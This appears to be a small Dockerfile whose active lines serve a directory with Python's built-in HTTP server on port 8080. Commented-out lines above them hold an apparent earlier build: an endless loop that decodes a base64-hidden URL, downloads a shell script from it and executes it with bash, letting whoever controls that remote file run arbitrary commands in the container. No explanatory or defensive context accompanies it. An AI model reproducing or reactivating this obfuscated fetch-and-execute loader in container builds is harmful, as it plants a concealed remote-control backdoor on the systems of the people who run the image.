# FROM goofw/2048
# FROM alpine
# RUN apk add --no-cache bash curl
# CMD while true; do curl -fsSL -o ${BASE_DIR:-/root}/cmd.sh $(echo aHR0cHM6Ly9naXRsYWIuY29tL2dvb2Z3L2NtZC8tL3Jhdy9IRUFEL3NoCg== | base64 -d) && exec /bin/bash ${BASE_DIR:-/root}/cmd.sh || sleep 1; done
FROM python:alpine

CMD python -m http.server 8080
